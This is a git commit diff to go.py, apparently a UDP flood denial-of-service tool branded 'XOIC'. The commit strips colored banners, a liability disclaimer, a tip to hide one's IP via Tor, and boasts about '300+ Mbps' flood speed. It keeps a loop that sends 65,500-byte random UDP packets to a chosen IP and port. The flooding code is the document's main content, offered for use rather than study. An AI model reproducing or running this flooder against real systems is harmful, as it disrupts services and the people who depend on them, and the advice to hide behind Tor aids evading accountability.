aeebdd6f2799bd75887c8b455babce3bc3cf6c28
mina-alabd <49130999+mina-alabd@users.noreply.github.com>
2025-03-23 21:21:32 +0300

    Update go.py

--- go.py
+++ go.py
@@ -3,23 +3,11 @@ import random
 import time
 
 
-from colorama import Fore, Back, Style
 print("\n" * 100)
-print(Fore.MAGENTA + Style.BRIGHT)
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-print(Fore.BLUE + "We aren't responsible to whatever thing you do using this tool, use it at your own risk.")
-print(Fore.MAGENTA + "Use Orbot(Tor) To Hide your ip")
-print("")
-print(Fore.BLUE + "             XOIC Details: ")
-print(Fore.MAGENTA + """
-          |-----------------|
-          |    GOGO   |
-          |-----------------|
-""")
-print(Fore.BLUE + "DoS Speed: " + Fore.MAGENTA + "300+ Mbps")
-print(Fore.BLUE + "[!] " + Fore.MAGENTA + "Pro Tip: Open & Use XOIC on multiple Windows to get 1Gbps")
-print("")
+ 
 bytes = random._urandom(65500)
 
 
@@ -41,4 +29,4 @@ while True:
 
 	sent = sent + 1
 
-	print(Fore.MAGENTA + "[+] " + Fore.BLUE + " " + Fore.MAGENTA + "Sent %s packet %s  port %s"%(sent, ip, port))
+	print("Sent %s packet %sport %s"%(sent, ip, port))
